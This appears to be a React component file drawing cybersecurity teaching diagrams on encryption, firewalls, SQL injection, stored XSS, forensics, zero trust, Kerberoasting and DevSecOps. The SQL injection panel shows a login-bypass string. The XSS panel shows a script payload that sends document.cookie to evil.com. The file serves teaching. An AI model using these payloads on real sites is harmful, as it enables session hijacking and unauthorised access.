'use client';

import React, { useState } from 'react';
import { cn } from '@/lib/utils';
import { Shield, Lock, Cpu, Server, Database, Globe, AlertTriangle, CheckCircle, ArrowRight, Layers, FileCode, Search, Terminal, Eye, Key } from 'lucide-react';

// ==========================================
// 1. Encryption & Decryption Cryptographic Flow Diagram
// ==========================================
export const EncryptionFlowDiagram: React.FC<{ className?: string }> = ({ className }) => {
  const [mode, setMode] = useState<'symmetric' | 'asymmetric'>('symmetric');

  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="flex flex-wrap items-center justify-between gap-4 mb-6 pb-4 border-b border-[#1B2A1F]">
        <div>
          <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
            // CRYPTOGRAPHIC_PIPELINE
          </div>
          <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
            {mode === 'symmetric' ? 'Symmetric Cryptography (AES-256-GCM Shared Key)' : 'Asymmetric Cryptography (RSA / ECC Public-Private Keypair)'}
          </h3>
        </div>
        <div className="inline-flex rounded-xl p-1 bg-[#050705] border border-[#1B2A1F]">
          <button
            type="button"
            onClick={() => setMode('symmetric')}
            className={cn(
              'px-3 py-1.5 rounded-lg text-xs font-bold transition-all',
              mode === 'symmetric'
                ? 'bg-[#00FF66] text-[#050705] shadow-xs'
                : 'text-[#91A596] hover:text-[#E8F5E9]'
            )}
          >
            Symmetric (AES-256)
          </button>
          <button
            type="button"
            onClick={() => setMode('asymmetric')}
            className={cn(
              'px-3 py-1.5 rounded-lg text-xs font-bold transition-all',
              mode === 'asymmetric'
                ? 'bg-[#00FF66] text-[#050705] shadow-xs'
                : 'text-[#91A596] hover:text-[#E8F5E9]'
            )}
          >
            Asymmetric (RSA / ECC)
          </button>
        </div>
      </div>

      {/* Interactive Process Pipeline */}
      <div className="grid grid-cols-1 lg:grid-cols-5 gap-3 items-center">
        {/* Step 1: Plaintext Input */}
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#1B2A1F] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
            <FileCode className="w-5 h-5" />
          </div>
          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#91A596] block">
            STEP 01
          </span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Plaintext (P)</h4>
          <p className="text-[11px] text-[#91A596] mt-1 font-sans">
            Unencrypted data payload: &quot;CONFIDENTIAL_KEY&quot;
          </p>
        </div>

        {/* Step 2: Encryption Engine */}
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
            <Lock className="w-5 h-5" />
          </div>
          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
            STEP 02: ENCRYPT
          </span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">
            {mode === 'symmetric' ? 'Cipher & Secret Key' : 'Receiver Public Key'}
          </h4>
          <p className="text-[10px] text-[#00FF66] mt-1">
            {mode === 'symmetric' ? 'AES-256 + IV Vector' : 'RSA-4096 / Ed25519'}
          </p>
        </div>

        {/* Step 3: Ciphertext in Transit */}
        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C] text-center">
          <div className="w-10 h-10 mx-auto rounded-lg bg-[#050705] border border-[#FF3B30] flex items-center justify-center text-[#FF3B30] mb-2 shadow-xs">
            <Shield className="w-5 h-5" />
          </div>
          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#FF3B30] block">
            STEP 03: TRANSIT
          </span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Ciphertext (C)</h4>
          <p className="text-[10px] font-mono text-[#FF3B30] mt-1 break-all">
            9f83e20ab47c...
          </p>
        </div>

        {/* Step 4: Decryption Engine */}
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
            <Key className="w-5 h-5" />
          </div>
          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
            STEP 04: DECRYPT
          </span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">
            {mode === 'symmetric' ? 'Shared Secret Key' : 'Receiver Private Key'}
          </h4>
          <p className="text-[10px] text-[#00FF66] mt-1">
            {mode === 'symmetric' ? 'Inverse Substitution' : 'Private Key Math'}
          </p>
        </div>

        {/* Step 5: Plaintext Verified */}
        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F] text-center">
          <div className="w-10 h-10 mx-auto rounded-lg bg-[#050705] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
            <CheckCircle className="w-5 h-5" />
          </div>
          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
            STEP 05: SUCCESS
          </span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Original Plaintext</h4>
          <p className="text-[11px] text-[#00FF66] font-bold mt-1">
            CONFIDENTIALITY PRESERVED
          </p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 2. Firewall Multi-Layer Inspection Pipeline
// ==========================================
export const FirewallInspectionDiagram: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
          // DEFENSIVE_PERIMETER_PIPELINE
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Firewall Multi-Tier Packet Inspection Lifecycle
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          Tracing inbound untrusted packets through Layer 3/4 stateful filters, Layer 7 deep packet inspection (NGFW), and DMZ isolation.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Stage 1: Ingress Untrusted Packets */}
        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#0E1510] border border-[#1B2A1F] text-[#91A596]">
                STAGE 01: INGRESS
              </span>
              <Globe className="w-4 h-4 text-[#91A596]" />
            </div>
            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Public Internet Traffic</h4>
            <p className="text-xs text-[#91A596] leading-relaxed font-sans mb-3">
              Raw IP packets arrive at network edge router containing SYN requests, malicious scans, and normal user HTTP/HTTPS requests.
            </p>
          </div>
          <div className="p-2 rounded-lg bg-[#271211] border border-[#441E1C] text-center">
            <span className="text-[10px] font-mono font-bold text-[#FF3B30]">
              STATUS: UNTRUSTED / UNFILTERED
            </span>
          </div>
        </div>

        {/* Stage 2: Layer 3/4 Stateful Inspection */}
        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#241C0E] border border-[#382B17] text-[#D9A441]">
                STAGE 02: L3/L4 STATEFUL
              </span>
              <Cpu className="w-4 h-4 text-[#D9A441]" />
            </div>
            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Stateful Connection Tracking</h4>
            <ul className="text-xs text-[#91A596] space-y-1.5 font-sans">
              <li className="flex items-start gap-1.5">
                <span className="text-[#00FF66] font-bold">+</span>
                <span>Check TCP 3-way handshake state table</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-[#00FF66] font-bold">+</span>
                <span>Match Source / Dest IP ACL rules</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-[#FF3B30] font-bold">-</span>
                <span className="text-[#FF3B30]">DROP invalid TCP flags (SYN-FIN)</span>
              </li>
            </ul>
          </div>
          <div className="mt-4 pt-2 border-t border-[#1B2A1F] text-[10px] text-[#D9A441]">
            CONN_STATE: ESTABLISHED
          </div>
        </div>

        {/* Stage 3: Layer 7 Next-Gen Application Inspection (WAF / IPS) */}
        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#271211] border border-[#441E1C] text-[#FF3B30]">
                STAGE 03: L7 NGFW / WAF
              </span>
              <Shield className="w-4 h-4 text-[#FF3B30]" />
            </div>
            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Deep Packet Inspection (DPI)</h4>
            <ul className="text-xs text-[#91A596] space-y-1.5 font-sans">
              <li className="flex items-start gap-1.5">
                <span className="text-[#00FF66] font-bold">+</span>
                <span>TLS Decryption &amp; Cert analysis</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-[#FF3B30] font-bold">-</span>
                <span className="text-[#FF3B30]">BLOCK SQLi / XSS HTTP payloads</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-[#00FF66] font-bold">+</span>
                <span>Signature &amp; Antivirus streaming scan</span>
              </li>
            </ul>
          </div>
          <div className="mt-4 pt-2 border-t border-[#1B2A1F] text-[10px] text-[#00FF66]">
            SIGNATURE: CLEAN
          </div>
        </div>

        {/* Stage 4: Protected Corporate Network */}
        <div className="p-5 rounded-xl bg-[#0D2214] border border-[#1B2A1F] flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#050705] text-[#00FF66]">
                STAGE 04: INTERNAL
              </span>
              <Server className="w-4 h-4 text-[#00FF66]" />
            </div>
            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Protected LAN &amp; Workloads</h4>
            <p className="text-xs text-[#91A596] leading-relaxed font-sans mb-3">
              Only scrubbed, authenticated packets arrive at backend app containers and internal database clusters.
            </p>
          </div>
          <div className="p-2 rounded-lg bg-[#050705] border border-[#1B2A1F] text-center">
            <span className="text-xs font-mono font-bold text-[#00FF66]">
              ZERO UNFILTERED ACCESS
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 3. Attack Lifecycle: SQL Injection Attack Flow
// ==========================================
export const SqlInjectionAttackFlow: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#FF3B30] mb-1">
          // ATTACK_VECTOR_DECONSTRUCTION
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          SQL Injection Tautology &amp; Authentication Bypass Flow
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          Step-by-step breakdown of how unvalidated input alters the intended database query structure.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-stretch">
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] text-[#00FF66] block mb-1">PHASE 01</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Adversary Injects Payload</h4>
          <p className="text-xs text-[#91A596] font-sans mb-3">
            Attacker enters a crafted string containing quotes and boolean logic into the login username field:
          </p>
          <div className="p-2.5 rounded-lg bg-[#0E1510] border border-[#FF3B30] text-[#FF3B30] text-xs font-mono">
            &apos; OR 1=1; --
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] text-[#D9A441] block mb-1">PHASE 02</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Backend Query Concatenation</h4>
          <p className="text-xs text-[#91A596] font-sans mb-3">
            Vulnerable PHP/Node backend concatenates input directly without parameterized prepared statements:
          </p>
          <div className="p-2.5 rounded-lg bg-[#0E1510] border border-[#1B2A1F] text-[#91A596] text-[11px] font-mono leading-relaxed">
            SELECT * FROM users WHERE user = <span className="text-[#FF3B30] font-bold">&apos;&apos; OR 1=1; --</span>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C]">
          <span className="text-[10px] text-[#FF3B30] block mb-1">PHASE 03</span>
          <h4 className="text-xs font-bold text-[#FF3B30] mb-2">Tautology Bypass Execution</h4>
          <p className="text-xs text-[#91A596] font-sans mb-3">
            Because <code className="text-[#00FF66]">1=1</code> is always true, the SQL engine returns the first admin user and comments out the password check.
          </p>
          <div className="p-2.5 rounded-lg bg-[#050705] border border-[#FF3B30] text-[#FF3B30] text-xs font-mono text-center font-bold">
            AUTH BYPASS: ADMIN ACCESS
          </div>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 4. Attack Lifecycle: Stored XSS Flow
// ==========================================
export const XssAttackFlow: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#D9A441] mb-1">
          // CLIENT_SIDE_EXPLOITATION
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Stored Cross-Site Scripting (XSS) Session Hijacking Flow
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          How persistent JavaScript payloads in comments compromise innocent user sessions.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-stretch">
        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] text-[#00FF66] block mb-1">STEP 01</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Payload Injected</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Attacker posts malicious comment containing &lt;script&gt;fetch(&apos;evil.com/&apos; + document.cookie)&lt;/script&gt;.
          </p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] text-[#D9A441] block mb-1">STEP 02</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Stored in Database</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Server stores raw unsanitized HTML in database without HTML entity escaping.
          </p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] text-[#FF3B30] block mb-1">STEP 03</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Victim Browses Page</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Innocent user views comment. Browser executes embedded JavaScript in victim&apos;s session context.
          </p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#271211] border border-[#441E1C]">
          <span className="text-[10px] text-[#FF3B30] block mb-1">STEP 04</span>
          <h4 className="text-xs font-bold text-[#FF3B30] mb-1">Session Hijacked</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Cookie exfiltrated to attacker server. Account taken over without credentials.
          </p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 5. Digital Forensics Timeline Pipeline
// ==========================================
export const ForensicsTimelineDiagram: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
          // DFIR_EVIDENCE_PIPELINE
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Digital Forensics Evidence Acquisition &amp; Reconstruction
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          Order of volatility: preserving volatile memory, generating bit-stream disk images, and building a forensic super-timeline.
        </p>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <div className="flex items-center gap-2 mb-2">
            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">1</span>
            <h4 className="text-xs font-bold text-[#E8F5E9]">Volatile Memory (RAM)</h4>
          </div>
          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
            Capture live RAM before shutdown to preserve decrypted credentials, injected processes, and active socket connections.
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <div className="flex items-center gap-2 mb-2">
            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">2</span>
            <h4 className="text-xs font-bold text-[#E8F5E9]">Bit-Stream Disk Image</h4>
          </div>
          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
            Hardware write-blocker attached. Raw E01 or DD image computed alongside SHA-256 integrity hash verification.
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <div className="flex items-center gap-2 mb-2">
            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">3</span>
            <h4 className="text-xs font-bold text-[#E8F5E9]">Artifact Parsing</h4>
          </div>
          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
            Extract Windows Registry hives, Shimcache, Amcache, Prefetch (.pf) files, and browser history to establish execution proof.
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F]">
          <div className="flex items-center gap-2 mb-2">
            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">4</span>
            <h4 className="text-xs font-bold text-[#E8F5E9]">Super-Timeline</h4>
          </div>
          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
            Correlate event timestamps using Plaso/log2timeline into unified sequence to determine Patient Zero and lateral movements.
          </p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 6. Zero Trust Architecture (ZTA) Pipeline
// ==========================================
export const ZeroTrustArchitectureDiagram: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
          // NIST_SP_800_207_ARCHITECTURE
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Zero Trust Continuous Verification Engine
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          Dynamic policy evaluation: identity verification, device health posture, and micro-segmentation enforcement before granting resource access.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-center">
        {/* Step 1 */}
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#91A596] block mb-1">INPUT CONTEXT</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Subject &amp; Telemetry</h4>
          <ul className="text-[11px] text-[#91A596] space-y-1 text-left font-sans">
            <li>• MFA Identity Claim</li>
            <li>• Device EDR Compliance</li>
            <li>• Geo-IP / Risk Score</li>
          </ul>
        </div>

        {/* Step 2 */}
        <div className="p-4 rounded-xl bg-[#241C0E] border border-[#382B17] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">PDP ENGINE</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Policy Decision Point</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Dynamic rule evaluation against threat intelligence and data sensitivity policies.
          </p>
        </div>

        {/* Step 3 */}
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">PEP GATEWAY</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Policy Enforcement</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Micro-segmented encrypted session tunnel established for authorized asset only.
          </p>
        </div>

        {/* Step 4 */}
        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">LEAST PRIVILEGE</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Target Workload</h4>
          <p className="text-[11px] text-[#00FF66] font-mono font-bold">
            NO LATERAL MOVEMENT
          </p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 7. Active Directory Kerberoasting Attack Chain
// ==========================================
export const ActiveDirectoryAttackFlowDiagram: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#FF3B30] mb-1">
          // DOMAIN_PRIVILEGE_ESCALATION
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Active Directory Kerberoasting Attack Flow
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          How an adversary with unprivileged domain user access extracts Kerberos TGS tickets encrypted with service account passwords and cracks them offline.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-center">
        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#91A596] block mb-1">PHASE 01</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">SPN Discovery</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Query LDAP for accounts registered with ServicePrincipalNames (e.g. MSSQLSvc).
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">PHASE 02</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Request TGS</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Domain user requests Kerberos TGS ticket from Domain Controller (KDC).
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#FF3B30] block mb-1">PHASE 03</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Offline Hashcat</h4>
          <p className="text-[11px] text-[#91A596] font-sans">
            Extract RC4/AES encrypted ticket hash from memory and crack offline with GPU.
          </p>
        </div>

        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C] text-center">
          <span className="text-[10px] font-mono font-bold uppercase text-[#FF3B30] block mb-1">PHASE 04</span>
          <h4 className="text-xs font-bold text-[#FF3B30] mb-1">Domain Privilege</h4>
          <p className="font-mono text-[10px] text-[#FF3B30] bg-[#050705] p-1.5 rounded border border-[#441E1C]">
            ADMIN PASS COMPROMISED
          </p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 8. DevSecOps Shift-Left Pipeline
// ==========================================
export const DevSecOpsPipelineDiagram: React.FC<{ className?: string }> = ({ className }) => {
  return (
    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
          // SHIFT_LEFT_SECURITY
        </div>
        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
          Shift-Left DevSecOps Continuous Pipeline
        </h3>
        <p className="text-xs text-[#91A596] mt-1 font-sans">
          Automated security checkpoints integrated from local developer IDE commits through build, container packaging, and cloud runtime monitoring.
        </p>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3 items-stretch">
        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">1. CODE</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">IDE &amp; Pre-Commit</h4>
          <p className="text-[11px] text-[#91A596] font-sans">Secret linting &amp; Git hooks (detect hardcoded API keys).</p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">2. BUILD</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">SAST &amp; SCA</h4>
          <p className="text-[11px] text-[#91A596] font-sans">Static code analysis (Semgrep) &amp; Dependency CVE audit.</p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#241C0E] border border-[#382B17]">
          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">3. TEST</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">DAST &amp; Container</h4>
          <p className="text-[11px] text-[#91A596] font-sans">Dynamic endpoint fuzzing &amp; Docker image scan (Trivy).</p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">4. DEPLOY</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">IaC Security</h4>
          <p className="text-[11px] text-[#91A596] font-sans">Terraform / K8s misconfiguration policy enforcement.</p>
        </div>

        <div className="p-3.5 rounded-xl bg-[#0D2214] border border-[#1B2A1F]">
          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">5. RUN</span>
          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Runtime CSPM</h4>
          <p className="text-[11px] text-[#91A596] font-sans">Cloud security posture &amp; eBPF behavioral anomaly detection.</p>
        </div>
      </div>
    </div>
  );
};

// ==========================================
// 9. Helper Function & Component to Map Topics to Specialized Diagrams
// ==========================================
export const getTopicDiagram = (topicId: string): React.ReactNode | null => {
  switch (topicId) {
    case 'zero-trust':
      return <ZeroTrustArchitectureDiagram />;
    case 'active-directory-security':
      return <ActiveDirectoryAttackFlowDiagram />;
    case 'devsecops':
      return <DevSecOpsPipelineDiagram />;
    case 'incident-response':
    case 'digital-forensics':
      return <ForensicsTimelineDiagram />;
    default:
      return null;
  }
};

export const TopicDiagramViewer: React.FC<{ topicId: string; className?: string }> = ({ topicId, className }) => {
  const diagram = getTopicDiagram(topicId);
  if (!diagram) return null;
  return <div className={className}>{diagram}</div>;
};
